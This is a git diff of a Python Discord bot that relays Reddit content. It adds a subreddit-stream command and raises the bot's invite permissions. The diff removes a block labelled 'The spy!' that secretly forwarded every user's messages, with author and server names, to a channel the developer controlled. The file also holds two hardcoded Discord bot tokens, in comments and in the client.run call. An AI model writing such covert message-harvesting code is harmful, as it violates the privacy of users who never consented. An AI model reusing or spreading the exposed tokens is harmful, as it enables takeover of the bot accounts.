@@ -1,4 +1,4 @@
-# https://discordapp.com/api/oauth2/authorize?client_id=437439562386505730&permissions=8&scope=bot
+# https://discordapp.com/api/oauth2/authorize?client_id=437439562386505730&permissions=2080898295&scope=bot
 import datetime
 import json
 import os
@@ -25,11 +25,6 @@ black_list = ["gory", "watchpeopledie", "gore", "WPDtalk"]
 
 @client.event
 async def on_message(message):
-    # The spy!
-    if message.author.id != client.user.id:
-        channel = client.get_channel(600950840559140884)
-        await channel.send('\n\n**User: ' + message.author.name + ' , Server: ' + message.guild.name + '**\n\n' + message.content)
-
     # admin commands:
     if message.content.startswith('!setstatus') and message.author.id == 408355239108935681:
         status = message.content.replace('!setstatus ', '')
@@ -61,6 +56,10 @@ async def on_message(message):
         help.add_field(name="!meme", value="Gives a random meme from /r/dankmemes on reddit!", inline=False)
         help.add_field(name="!me", value="See your account", inline=False)
 
+        help_substream = discord.Embed(title="Sub stream commands **BETA**:",
+                                  description="**Commands to create a sub reddit stream (Where the bot messages all posts to a channel in a server)**", color=red)
+        help_substream.add_field(name="!startstream [subreddit name]", value="Start a stream", inline=False)
+
         help_user = discord.Embed(title="User commands:",
                                   description="**Commands to add accounts and account management**", color=red)
         help_user.add_field(name="!connect u/[user name here]", value="Connect a reddit connect", inline=False)
@@ -70,6 +69,7 @@ async def on_message(message):
 
         help_user.set_footer(text="RedditBot " + version)
         await message.author.send(embed=help)
+        await message.author.send(embed=help_substream)
         await message.author.send(embed=help_user)
         await message.author.send(
             "Give your feed back with the !feedback command! \n\nLike the bot? Support it with a vote! http://bit.ly/redditDiscordVote")
@@ -145,6 +145,7 @@ async def on_message(message):
             sub.set_footer(text="RedditBot " + version)
             await loadingMessage.edit(embed=sub)
 
+
     if message.content.startswith('!mods'):
         loading = discord.Embed(title='', color=red)
         loading.add_field(name='Loading...', value='<a:loading:596157264788979750>')
@@ -175,6 +176,50 @@ async def on_message(message):
                 modMessage.set_footer(text="RedditBot " + version)
                 await loadingMessage.edit(embed=modMessage)
 
+    # subreddit stream
+    if message.content.startswith('!startstream'):
+        if message.content == '!startstream':
+            await message.channel.send(message.author.mention + ' sorry, you neeed to use the command like this `!startstream [subreddit name here]`')
+        else:
+            subreddit_name = message.content.replace("!startstream ", "")  # removes !startstream
+            subreddit = reddit.subreddit(subreddit_name)  # makes subreddit
+            try:
+                if not message.author.guild_permissions.administrator:
+                    await message.channel.send(
+                        'Sorry ' + message.author.mention + ' your not a admin, you need a admin to do this')
+                elif subreddit.over18:
+                    await message.channel.send(
+                        'Sorry ' + message.author.mention + ' im just going to say no..')
+                elif subreddit_name in black_list:
+                    await message.channel.send(
+                        'Sorry ' + message.author.mention + ' Due to discords tos (https://discordapp.com/terms) the bot cant show this')
+                else:
+                    try:
+                        with open("streams/" + subreddit_name + '.json', 'r') as f:
+                            data = json.load(f)
+
+                            channel = await message.guild.create_text_channel(subreddit_name + ' post stream')
+
+                            data['channels'].append(channel.id)
+                            f.close()
+                            with open("streams/" + subreddit_name + '.json', 'w+') as outfile:
+                                json.dump(data, outfile, indent=4)
+                                await message.channel.send(
+                                    message.author.mention + ' The stream will start in a few minutes. If you delete the channel the stream will be deleted to. You can edit the channels name and perms as you please (make sure the bot can embed and message in the channel!)\n\n**This is a beta feature and will probably go offine at some point till we has ironed out all the bugs!**')
+                    except FileNotFoundError:
+                        channel = await message.guild.create_text_channel(subreddit_name + ' post stream')
+
+                        data = {
+                            'channels': [channel.id]
+                        }
+
+                        with open("streams/" + subreddit_name + '.json', 'w+') as outfile:
+                            json.dump(data, outfile, indent=4)
+                            await message.channel.send(
+                            message.author.mention + ' The stream will start in a few minutes. If you delete the channel the stream will be deleted to. You can edit the channels name and perms as you please (make sure the bot can embed and message in the channel!)\n\n**This is a beta feature and will probably go offine at some point till we has ironed out all the bugs!**')
+            except AttributeError:
+                await message.channel.send('Your in a dm or there was a error')
+                
     if message.content.startswith('!u/'):
         loading = discord.Embed(title='', color=red)
         loading.add_field(name='Loading...', value='<a:loading:596157264788979750>')
@@ -317,4 +362,4 @@ async def on_ready():
 # beta: NTM2MDQ5MTY2NTIzMDM5NzU5.XS7MxA.vYwHmHmwlIOI7LTHSJJk_kPbeqw
 # normal: NDM3NDM5NTYyMzg2NTA1NzMw.XS7OkA.mCBMQDGVYXh-gpFps392AZrzjj0
 
-client.run("NDM3NDM5NTYyMzg2NTA1NzMw.XS7OkA.mCBMQDGVYXh-gpFps392AZrzjj0")
+client.run("NTM2MDQ5MTY2NTIzMDM5NzU5.XS7MxA.vYwHmHmwlIOI7LTHSJJk_kPbeqw")
